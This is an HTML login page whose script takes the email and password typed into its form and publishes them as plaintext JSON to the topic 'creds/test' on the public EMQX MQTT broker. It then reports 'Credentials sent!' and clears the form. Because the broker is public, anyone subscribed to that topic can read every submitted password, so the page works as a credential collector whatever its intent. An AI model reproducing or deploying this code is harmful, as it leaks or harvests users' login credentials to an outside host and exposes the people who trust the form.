<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login via MQTT</title>
    <style>
        body {
            font-family: Arial, sans-serif; text-align: center; margin-top: 100px;
        }
        #loginForm {
            margin: auto; width: 300px; padding: 24px; border: 1px solid #eee; border-radius: 8px;
            background: #fafafa; box-shadow: 2px 2px 8px #ddd;
        }
        input, button { 
            font-size: 1.1rem; margin: 8px 0; padding: 6px 10px; width: 90%; 
            box-sizing: border-box; 
        }
        #status { margin-top: 16px; }
    </style>
</head>
<body>
    <h2>Login</h2>
    <form id="loginForm">
        <input type="email" id="email" required placeholder="Email"><br>
        <input type="password" id="password" required placeholder="Password"><br>
        <button type="submit">Login</button>
    </form>
    <div id="status"></div>

    <!-- MQTT.js library -->
    <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
    <script>
        // Connect to the EMQX broker over secure WebSocket
        const client = mqtt.connect('wss://broker.emqx.io:8084/mqtt');

        client.on('connect', function () {
            document.getElementById('status').innerText = "Connected to MQTT broker.";
        });

        client.on('error', function (err) {
            document.getElementById('status').innerText = "MQTT connection error!";
            console.error(err);
        });

        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const payload = JSON.stringify({
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            });
            // Send credentials to topic 'creds/test'
            client.publish('creds/test', payload);
            document.getElementById('status').innerText = "Credentials sent!";
            document.getElementById('email').value = "";
            document.getElementById('password').value = "";
        };
    </script>
</body>
</html>
